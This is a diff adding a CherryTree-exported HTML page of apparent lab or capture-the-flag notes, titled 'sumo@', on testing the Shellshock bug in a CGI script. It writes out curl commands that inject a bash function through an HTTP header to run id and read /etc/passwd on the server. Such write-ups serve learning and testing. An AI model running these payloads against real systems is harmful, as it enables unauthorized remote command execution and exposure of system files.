@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>sumo@</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>sumo@</h1><br/><p>nikto revealed some juicy info , about the new vuln called shellshock , but how to test it manually:</p><p></p><p></p><p><em><strong><span style="color:#ff7800;">curl -v server/cgi-bin/</span></strong></em><span style="color:#ff7800;">index.bash or test {in my case} or {index.sh}</span> ... if it gives ok then </p><p></p><p><em><strong><span style="color:#ff7800;">curl -v server/cgi-bin/</span></strong></em><span style="color:#ff7800;">test -</span><em><strong><span style="color:#ff7800;">H &quot;custom:() { ignored; }; /usr/bin/id&quot;</span></strong></em><span style="color:#ff7800;"> </span>- try this , and we&#39;ll get the 500 internal server error and the command will be executed in the logs </p><p></p><p>also then:</p><p></p><p><em><strong><span style="color:#ff7800;">curl  server/cgi-bin/test -H &quot;custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd &quot;</span></strong></em> - do this and at the end you&#39;ll get the output </p><p></p><p>this rce is due to the shellshock , where we pass the command after the header - theis is explained thoroughly in the notebook in the kernel section at last upside down</p><p></p><p></p><p>and also checkout:</p><p><a href="https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf">https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf</a></p><p></p><p></p><p>we can also check via this:</p><p><img src="images/11-1.png" alt="images/11-1.png" /></p><p></p><p>always try these 6 binaries on every server:</p><p></p><p></p><p><img src="images/11-2.png" alt="images/11-2.png" /></p><p></p></div>
+</body>
+</html>
